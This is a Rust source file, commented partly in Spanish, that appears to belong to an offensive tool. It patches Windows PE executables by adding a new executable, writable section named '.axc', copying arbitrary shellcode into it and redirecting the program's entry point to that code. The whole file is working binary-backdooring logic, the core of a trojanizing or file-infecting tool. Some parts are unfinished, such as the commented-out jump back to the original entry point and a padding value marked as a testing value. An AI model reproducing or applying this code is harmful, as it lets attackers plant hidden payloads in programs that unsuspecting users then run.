use goblin::pe::PE;

use crate::pedata;

/// Injects shellcode into the PE file and adjusts headers accordingly.
/// Arguments:
///     - buffer: The buffer representing the PE file.
///     - pe: A reference to the PE struct.
///     - shellcode: The shellcode to inject.
pub fn inject_shellcode(buffer: &mut Vec<u8>, pe: &PE, shellcode: &mut Vec<u8>) {
    println!("[*] Starting shellcode injection process......");

    // Genera un nuevo encabezado de sección
    let (pointer_to_raw_data, new_section_header, new_sizeofimage) = create_new_section_header(&pe, shellcode.clone());
    
    // Obteniendo el RVA de la nueva seccion, necesario para cambiar el entry point
    let rva_bytes = &new_section_header[12..16]; // Extrae los bytes correspondientes al RVA
    let new_section_rva = u32::from_le_bytes(rva_bytes.try_into().unwrap()); // Convierte los bytes a un u32
    
    /* 
    TODO: Implementar un sistema que añada los opcodes de una instruccion de salto despues de mi shellcode
    
    shellcode.resize(shellcode.len() + 7, 0); // 5 bytes de la instruccion de salto
    
    //update_section_headers(pe, buffer, new_section_header.len());    
    
    // Leer el punto de entrada del archivo PE
    let old_entry_point_rva: u32 = pe
        .header
        .optional_header
        .unwrap()
        .standard_fields
        .address_of_entry_point as u32;

    // En los 5 bytes de antes, añado la orden de salto al entry point original
    let shellcode_end = new_section_rva + (shellcode.len() as u32);
    
    // Preparar la instrucción `mov eax, <entry_point>`
    let mut mov_instruction = vec![0xB8];
    mov_instruction.extend(&old_entry_point_rva.to_le_bytes());

    // Preparar la instrucción `jmp eax`
    let jmp_instruction = vec![0xFF, 0xE0];

    // Combinar las instrucciones y añadirlas al final de la shellcode
    let mut combined_instruction = Vec::new();
    combined_instruction.extend(mov_instruction);
    combined_instruction.extend(jmp_instruction);

    // Asegúrate de que el espacio reservado sea suficiente
    assert_eq!(combined_instruction.len(), 7, "[ERROR] Las instrucciones calculadas tienen un tamaño incorrecto");
    shellcode.splice(shellcode.len()-7..shellcode.len(), combined_instruction.iter().cloned());
    
    println!("[*] Old entry point {:X}",old_entry_point_rva);
    println!("[*] Añadiendo instrucciones de salto directo a la shellcode {:?}",combined_instruction);
*/

    let section_table_offset:usize = pedata::_get_section_table_offset(buffer, pe) as usize;
    
    #[cfg(debug_assertions)]
    println!(
        "[*] Offset de la tabla de secciones en 0x{:X}",
        section_table_offset
    );

    let size_of_headers = pe.header.optional_header.unwrap().windows_fields.size_of_headers;
    let number_of_sections = pe.header.coff_header.number_of_sections as usize;
    // Se obtiene el final de la tabla de secciones, que es donde se insertará el nuevo encabezado
    let last_section_end = ( number_of_sections * 40) + section_table_offset;
    let _section_table_end = section_table_offset + size_of_headers as usize; 

    if ((number_of_sections + 1) * 40) > size_of_headers as usize {
        // TODO: Encontrar un binario con estas caracteristicas para probar a recalcular la tabla de secciones
        println!("TODO");
        println!("{:X} {:X}",number_of_sections, size_of_headers);
        panic!("Hace falta recalcular el tamaño del numero de secciones porque no cabe la nueva. Esta funcionalidad no esta disponible todavia");
    }

    // Inserta el nuevo encabezado de sección en la posición correcta dentro de la tabla de secciones
    #[cfg(debug_assertions)]{
        println!("[*] Offset of the new section 0x{:X} -> 0x{:X}", last_section_end,last_section_end+40);
        println!("[*] Adding new section with size 0x{:X}", new_section_header.len());    
    }
    buffer[last_section_end..last_section_end + 40].copy_from_slice(&new_section_header);
    
    // Increment number of sections
    increment_number_of_sections(buffer);
    
    buffer.truncate(pointer_to_raw_data);
    
    // TODO: el 0x2000 es un valor de testing, hace falta ajustarlo
    buffer.resize(buffer.len() + 0x2000, 0);
 
    // Añadiendo relleno en forma de ceros por el tamaño de la shellcode
    println!("[*] Filling shellcode lenght with zeros into buffer. Actual buffer size {:X}",buffer.len());
    buffer.extend(vec![0;shellcode.len()]);

    // Añadiendo la shellcode ( deberia de sustituir a los 0 )
    println!("!!! [#] INSERTING THE SHELLCODE FROM POSITION 0x{:X} to 0x{:X}",pointer_to_raw_data, pointer_to_raw_data + shellcode.len());
    buffer[pointer_to_raw_data..pointer_to_raw_data + shellcode.len()].copy_from_slice(&shellcode);
    
    // Calculo padding para los datos que vengan detras
    let padding_len = pedata::calculate_padding(
        buffer.len(),
        pe.header
            .optional_header
            .unwrap()
            .windows_fields
            .file_alignment,
    );
    println!("[*] Inserting padding after SHELLCODE. Padding: {:X}",padding_len);
    buffer.extend(vec![0; padding_len]); // Añade padding si es necesario.
    
    println!("[*] Buffer size after inyection: {}", buffer.len());
    
    // Ajusta el IMAGE_OPTIONAL_HEADER con la nueva cabecera
    adjust_image_optional_header(buffer, pe, new_sizeofimage);

    pedata::change_entry_point(new_section_rva, buffer);
}

/// Updates existing section headers to accommodate the new section.
/// Arguments:
///     - pe: A reference to the PE struct.
///     - buffer: The buffer representing the PE file.
///     - section_header_size: The size of the new section header.
fn _update_section_headers(pe: &PE, buffer: &mut Vec<u8>, section_header_size: usize) {

    let sections_table_offset = pedata::_get_section_table_offset(buffer, pe) as usize;
    let number_of_sections = pe.header.coff_header.number_of_sections as usize;

    for i in 0..number_of_sections {
        let section_offset = sections_table_offset + (i * 40);
        let virtual_address_offset = section_offset + 12; // Offset to 'VirtualAddress' in section header.
        let pointer_to_raw_data_offset = section_offset + 20; // Offset to 'PointerToRawData' in section header
        
        let section_name_bytes = &buffer[section_offset..section_offset + 8];
        // Convertir los bytes a String, deteniéndose en el primer byte nulo.
        let section_name = section_name_bytes.iter()
            .take_while(|&&c| c != 0) // Tomar bytes hasta el primer cero (si lo hay).
            .map(|&c| c as char) // Convertir cada byte a char.
            .collect::<String>(); // Recolectar los chars en una String.
                
        // Update 'VirtualAddress' for each section.
        let virtual_address: u32 = u32::from_le_bytes(
            buffer[virtual_address_offset..virtual_address_offset + 4]
                .try_into()
                .unwrap(),
        );
        let updated_virtual_address = virtual_address + section_header_size as u32;
        buffer[virtual_address_offset..virtual_address_offset + 4]
            .copy_from_slice(&updated_virtual_address.to_le_bytes());
        print!(
            "[*] Updated section {} \"{}\": VirtualAddress to 0x{:X} |",
            i,section_name, updated_virtual_address
        );

        // Obtiene el valor actual de 'PointerToRawData'
        let pointer_to_raw_data: u32 = u32::from_le_bytes(
            buffer[pointer_to_raw_data_offset..pointer_to_raw_data_offset + 4]
                .try_into()
                .unwrap(),
        );

        // Solo actualiza 'PointerToRawData' si no es cero
        if pointer_to_raw_data != 0 {
            let updated_pointer_to_raw_data = pointer_to_raw_data + section_header_size as u32;
            buffer[pointer_to_raw_data_offset..pointer_to_raw_data_offset + 4]
                .copy_from_slice(&updated_pointer_to_raw_data.to_le_bytes());

            println!(
                "PointerToRawData to 0x{:X}",
                updated_pointer_to_raw_data
            );
        }else{
            println!("");
        }
    }

}


/// Generates a new section header for adding additional code or data.
/// Arguments:
///     - pe: A reference to the PE struct.
///     - shellcode: The shellcode to be added in the new section.
/// Returns:
///     - A tuple with the new section's raw data start position, the section header, and the new size of image.
pub fn create_new_section_header(pe: &PE, shellcode: Vec<u8>) -> (usize, Vec<u8>, u32) {
    const SECTION_HEADER_SIZE: usize = 40;
    const DEFAULT_CHARACTERISTICS: u32 = 0xE0000020; // Executable, readable, writable

    let last_section = pedata::find_last_section(pe).expect("Failed to find the last section");
    #[cfg(debug_assertions)]
    println!(
        "[*] Last section: name: {}\n\tRVA: 0x{:X}\n\tsize: 0x{:X}\n\traw data ptr: 0x{:X}\n\traw size: 0x{:X}",
        String::from_utf8_lossy(&last_section.name),
        last_section.virtual_address, 
        last_section.virtual_size,
        last_section.pointer_to_raw_data,
        last_section.size_of_raw_data
    );

    let file_alignment = pe.header.optional_header.unwrap().windows_fields.file_alignment;
    let section_alignment = pe.header.optional_header.unwrap().windows_fields.section_alignment;
    println!("[*] Alignments - File: 0x{:X}, Section: 0x{:X}", file_alignment, section_alignment);

    let new_section_virtual_address = (last_section.virtual_address + last_section.virtual_size + section_alignment - 1) & !(section_alignment - 1);
    let virtual_size = ((shellcode.len() as u32 + section_alignment - 1) / section_alignment) * section_alignment;
    let size_of_raw_data = ((shellcode.len() as u32 + file_alignment - 1) / file_alignment) * file_alignment;

    let last_section_end_aligned = (last_section.pointer_to_raw_data + last_section.size_of_raw_data + file_alignment - 1) & !(file_alignment - 1);

    println!("┌───────────────────────────────┐");
    println!("│ New Section\t\t\t│");
    println!("│ RVA: 0x{:X}\t\t\t│", new_section_virtual_address);
    println!("│ Virtual size: 0x{:X}\t\t│", virtual_size);
    println!("│ RawData start at: 0x{:X}\t│", last_section_end_aligned);
    println!("│ RawData size: 0x{:X}\t\t│", size_of_raw_data);
    println!("│ Characteristics: 0x{:X}\t│", DEFAULT_CHARACTERISTICS);
    println!("└───────────────────────────────┘");

    let mut section_header = Vec::with_capacity(SECTION_HEADER_SIZE);
    section_header.extend_from_slice(b".axc\0\0\0\0");  // Name of the section
    section_header.extend(&virtual_size.to_le_bytes());
    section_header.extend(&new_section_virtual_address.to_le_bytes());
    section_header.extend(&size_of_raw_data.to_le_bytes());
    section_header.extend(&last_section_end_aligned.to_le_bytes());
    section_header.extend(&[0u8; 8]);  // Padding for relocations and line numbers
    section_header.extend(0x00000000u32.to_le_bytes());

    section_header.extend(&DEFAULT_CHARACTERISTICS.to_le_bytes());

    // Ensure the section header is exactly 40 bytes.
    while section_header.len() < SECTION_HEADER_SIZE {
        section_header.push(0);
    }
    assert_eq!(section_header.len(), SECTION_HEADER_SIZE);

    let end_of_last_section = new_section_virtual_address + virtual_size;
    let new_size_of_image = (end_of_last_section + section_alignment - 1) & !(section_alignment - 1);

    (last_section_end_aligned as usize, section_header, new_size_of_image)
}

/// Adjusts the image optional header for the new section.
/// Arguments:
///     - buffer: The PE file buffer to adjust.
///     - pe: A reference to the PE struct.
///     - last_section_header: The last section header before adjustment.
fn adjust_image_optional_header(buffer: &mut Vec<u8>, pe: &PE, new_size_of_image:u32) {

    println!("[*] Tamaño del buffer actual: {:X} ",buffer.len());
    let image_alignmanet:u32 = pe.header.optional_header.unwrap().windows_fields.file_alignment;
    let buffer_padding = pedata::calculate_padding(buffer.len(), image_alignmanet);
    buffer.extend(vec![0; buffer_padding]); // Añade padding si es necesario.
    println!("[*] Tamaño del buffer despues de añadir padding: {:X} ",buffer.len());

    let e_lfanew = u32::from_le_bytes(buffer[0x3C..0x40].try_into().unwrap()) as usize;
    let optional_header_offset = e_lfanew + 4 + 20; // Saltar 4 bytes de 'Signature' + 20 bytes de 'IMAGE_FILE_HEADER'

    // Encontrar el offset de 'SizeOfImage' dentro de 'IMAGE_OPTIONAL_HEADER'
    let size_of_image_offset = optional_header_offset + 56; // 'SizeOfImage' está a 56 bytes del inicio de 'IMAGE_OPTIONAL_HEADER'
    let size_of_headers_offset = optional_header_offset + 60; // 'SizeOfHeaders' está justo después de 'SizeOfImage'

    // Calcular el nuevo 'SizeOfImage'
    if buffer.len() > u32::MAX as usize {
        panic!("El tamaño del buffer excede el máximo permitido para un valor u32");
    }
    //let new_size_of_image = buffer.len() as u32;
    
    // Ajustar 'SizeOfImage' en el buffer
    buffer[size_of_image_offset..size_of_image_offset + 4].copy_from_slice(&new_size_of_image.to_le_bytes());
    
    println!("[*] SizeOfImage ajustado a {:X} en el offset 0x{:X}", new_size_of_image, size_of_image_offset);

    // Calcular el nuevo 'SizeOfHeaders', sumando 40 bytes del nuevo encabezado de sección
    let current_size_of_headers = u32::from_le_bytes(buffer[size_of_headers_offset..size_of_headers_offset + 4].try_into().unwrap());
    let new_size_of_headers = current_size_of_headers;//+ 40; // Añadir tamaño de un encabezado de sección estándar

    // Ajustar 'SizeOfHeaders' en el buffer
    buffer[size_of_headers_offset..size_of_headers_offset + 4]
        .copy_from_slice(&new_size_of_headers.to_le_bytes());

    println!("[*] SizeOfHeaders ajustado a {:X} en el offset 0x{:X}", new_size_of_headers, size_of_headers_offset);
    
}

/// Increments the number of sections in the PE file header.
/// Arguments:
///     - buffer: The buffer representing the PE file.
fn increment_number_of_sections(buffer: &mut Vec<u8>) {
    let e_lfanew = u32::from_le_bytes(buffer[0x3C..0x40].try_into().unwrap()) as usize;
    let file_header_offset = e_lfanew + 4; // Saltar 4 bytes de la 'Signature'
    let number_of_sections_offset = file_header_offset + 2; // Saltar el campo 'Machine'

    let number_of_sections = u16::from_le_bytes(
        buffer[number_of_sections_offset..number_of_sections_offset + 2]
            .try_into()
            .unwrap(),
    );

    let new_number_of_sections: u16 = number_of_sections + 1; // Aumento del numero de secciones en 1

    println!("[*] Updated: number of sections Old: {:?} New: {:?}",number_of_sections, new_number_of_sections);

    buffer[number_of_sections_offset..number_of_sections_offset + 2]
        .copy_from_slice(&new_number_of_sections.to_le_bytes());

}

